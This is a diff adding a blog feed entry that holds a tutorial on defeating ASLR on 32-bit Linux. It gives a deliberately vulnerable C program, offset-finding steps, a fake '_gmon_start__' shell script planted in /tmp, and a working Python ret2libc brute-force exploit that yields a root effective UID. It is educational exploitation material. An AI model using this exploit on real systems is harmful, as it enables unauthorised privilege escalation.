@@ -257,6 +257,213 @@ mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
 			</item>
 		
 			<item>
+				<title>ASLR Bruteforce</title>
+				<description>&lt;h1 id=&quot;1-surroundings&quot;&gt;1. Surroundings&lt;/h1&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;uname &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
+Linux debian 3.16.0-4-amd64 &lt;span class=&quot;c&quot;&gt;#1 SMP Debian 3.16.39-1+deb8u2 (2017-03-07) x86_64 GNU/Linux&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;lsb_release &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
+No LSB modules are available.
+Distributor ID:	Debian
+Description:	Debian GNU/Linux 8.7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;jessie&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Release:	8.7
+Codename:	jessie
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc &lt;span class=&quot;nt&quot;&gt;--version&lt;/span&gt;
+gcc &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian 4.9.2-10&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 4.9.2
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/lib32/libc.so.6 
+GNU C Library &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian GLIBC 2.19-18+deb8u7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; stable release version 2.19, by Roland McGrath et al.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;2-explanation&quot;&gt;2. Explanation&lt;/h1&gt;
+&lt;p&gt;Today I will show you a method to bruteforce the ASLR. This method is very usefull because it can bypass NX and ASLR protections together! But this method is only available in a x86 or less architecture because of the addresses lenght. The step is very similar as a Ret2libc attack but in our case we will take a LibC base reference address and loop the binary execution while the ASLR isn’t set to our LibC reference’s address.&lt;/p&gt;
+
+&lt;h1 id=&quot;3-vulnerable-binary&quot;&gt;3. Vulnerable binary&lt;/h1&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;// gcc main.c -z execstack -fno-stack-protector -m32
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Welcome %s!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ac&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;av&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ac&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Usage : ./a.out [name]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;print_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;av&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;checksec &lt;span class=&quot;nt&quot;&gt;--file&lt;/span&gt; a.out       
+RELRO           STACK CANARY      NX            PIE          RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE
+No RELRO        No canary found   NX enabled    No PIE       No RPATH   No RUNPATH   No	0		   4   a.out
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It’s a very simple peace of code with an overflow in “print_name” function.&lt;/p&gt;
+
+&lt;h1 id=&quot;4-the-payload&quot;&gt;4. The payload&lt;/h1&gt;
+&lt;p&gt;The payload is very easy. It will look like:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;+-------------------+
+|      padding      |
++-------------------+
+|  system address&lt;span class=&quot;s1&quot;&gt;'s |
++-------------------+
+|   exit address'&lt;/span&gt;s  |
++-------------------+
+| /bin/sh address&lt;span class=&quot;s1&quot;&gt;'s |
++-------------------+
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Well, it’s a Ret2libc as we’ve seen in the previous article. The particularity is that we don’t know any of the addresses we needed. So we first need to know the LibC address’s to deduct the addresses we needed.&lt;/p&gt;
+
+&lt;p&gt;If we check the library addresses we can see something very interesting:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ldd a.out|grep libc
+	libc.so.6 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /lib32/libc.so.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xf757f000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ldd a.out|grep libc
+	libc.so.6 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /lib32/libc.so.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xf75fb000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ldd a.out|grep libc
+	libc.so.6 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /lib32/libc.so.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xf7555000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+ldd a.out|grep libc
+	libc.so.6 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /lib32/libc.so.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xf751e000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;There are only 8 bits of the Libc address’s which evolves. So if we take randomly one of these addresses, there is a lot of chance that we will get it an other time!&lt;/p&gt;
+
+&lt;p&gt;So we’ve the Libc address, now we need the system/exit offset functions to add it to our base Libc address to know the final addresses function. I will use objdump to get the offsets:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; /lib32/libc.so.6|egrep &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;exit&amp;gt;:|&amp;lt;__libc_system&amp;gt;:&quot;&lt;/span&gt;
+000311b0 &amp;lt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;:
+0003e3e0 &amp;lt;__libc_system&amp;gt;:
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It’s OK for the addresses offsets. Now we need a string for the first system function argument.
+To remind:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We will use a little trick to do this. We will use a string from the binary section where the addresses don’t change (like rodata section). The string need to end with a null byte. (‘\0’) I’m habits to use a common binary string in the dynstr section:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; a.out &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; .dynstr|grep &lt;span class=&quot;s2&quot;&gt;&quot;gmon&quot;&lt;/span&gt;
+ 804825c 5f676d6f 6e5f7374 6172745f 5f00474c  _gmon_start__.GL
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Great, the string “_gmon_start__” will be perfect. As this command does not exist actually, we will create it. The file “/tmp/_gmon_start__” will contain:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/sh&lt;/span&gt;
+/bin/sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;No more or less! After did it, we set the correct right to the file and we add “/tmp” repertory to the $PATH environment variable:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;chmod 777 /tmp/_gmon_start__ &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;:/tmp
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As you might understand, we will execute a command we’ve create, named “_gmon_start__” which will execute a /bin/sh.&lt;/p&gt;
+
+&lt;p&gt;It’s OK for this part! The last step before writting the exploit is to get the padding. Another time thanks to objdump:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; a.out|grep &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;print_name&amp;gt;:&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; 17 &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt;              
+372:0804845b &amp;lt;print_name&amp;gt;:
+373- 804845b:	55                   	push   %ebp
+374- 804845c:	89 e5                	mov    %esp,%ebp
+375- 804845e:	83 ec 48             	sub    &lt;span class=&quot;nv&quot;&gt;$0x48&lt;/span&gt;,%esp
+376- 8048461:	83 ec 08             	sub    &lt;span class=&quot;nv&quot;&gt;$0x8&lt;/span&gt;,%esp
+377- 8048464:	ff 75 08             	pushl  0x8&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%ebp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+378- 8048467:	8d 45 b8             	lea    &lt;span class=&quot;nt&quot;&gt;-0x48&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%ebp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax
+379- 804846a:	50                   	push   %eax
+380- 804846b:	e8 b0 fe ff ff       	call   8048320 &amp;lt;strcpy@plt&amp;gt;
+381- 8048470:	83 c4 10             	add    &lt;span class=&quot;nv&quot;&gt;$0x10&lt;/span&gt;,%esp
+382- 8048473:	83 ec 08             	sub    &lt;span class=&quot;nv&quot;&gt;$0x8&lt;/span&gt;,%esp
+383- 8048476:	8d 45 b8             	lea    &lt;span class=&quot;nt&quot;&gt;-0x48&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%ebp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax
+384- 8048479:	50                   	push   %eax
+385- 804847a:	68 70 85 04 08       	push   &lt;span class=&quot;nv&quot;&gt;$0x8048570&lt;/span&gt;
+386- 804847f:	e8 8c fe ff ff       	call   8048310 &amp;lt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;@plt&amp;gt;
+387- 8048484:	83 c4 10             	add    &lt;span class=&quot;nv&quot;&gt;$0x10&lt;/span&gt;,%esp
+388- 8048487:	c9                   	leave  
+389- 8048488:	c3                   	ret    
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;You can see at line 378 that our buffer is at 0x48 bytes from the base pointer. So we just need to add four bytes to this value to also erase ebp value. A little “echo” tricks to convert value from a base to another:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ibase=16; 4C&quot;&lt;/span&gt;|bc
+76
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can now write our exploit!&lt;/p&gt;
+
+&lt;h1 id=&quot;5-the-exploit&quot;&gt;5. The exploit&lt;/h1&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/env python&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# coding: utf-8&lt;/span&gt;
+
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;subprocess&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xf756e000&lt;/span&gt;           &lt;span class=&quot;c&quot;&gt;# base libc address's&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;system_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0003e3e0&lt;/span&gt;  &lt;span class=&quot;c&quot;&gt;# system offset function&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;exit_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x000311b0&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;# exit offset function&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;binsh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;mh&quot;&gt;0x804825c&lt;/span&gt;          &lt;span class=&quot;c&quot;&gt;# string addresse's (_gmon_start__)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;system_offset&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# final system address's&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;exit_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exit_offset&lt;/span&gt;     &lt;span class=&quot;c&quot;&gt;# final exit address's&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;76&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exit_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binsh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./a.out&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;	
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Done&quot;&lt;/span&gt;
+    	&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;KO&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;6-exploitation&quot;&gt;6. Exploitation&lt;/h1&gt;
+&lt;p&gt;Sometimes the input/output failed, so you need to retry the exploitation to correct it.&lt;/p&gt;
+
+&lt;p&gt;A root shell per favor!&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python exploit.py
+...
+KO
+
+KO
+
+KO
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;id
+&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;user&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;user&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;euid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;user&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Done.&lt;/p&gt;
+</description>
+				<pubDate>Sun, 14 May 2017 00:00:00 +0100</pubDate>
+				<link>/pwn/2017/05/14/aslr_bruteforce.html</link>
+				<guid isPermaLink="true">/pwn/2017/05/14/aslr_bruteforce.html</guid>
+			</item>
+		
+			<item>
 				<title>Hello World!</title>
 				<description>&lt;p&gt;&lt;strong&gt;dbyll&lt;/strong&gt; is minimalist, stylish theme for jekyll. Supports gravatar, account links (github, twitter, e-mail, pinterest, résume file) and a bio.&lt;/p&gt;
 
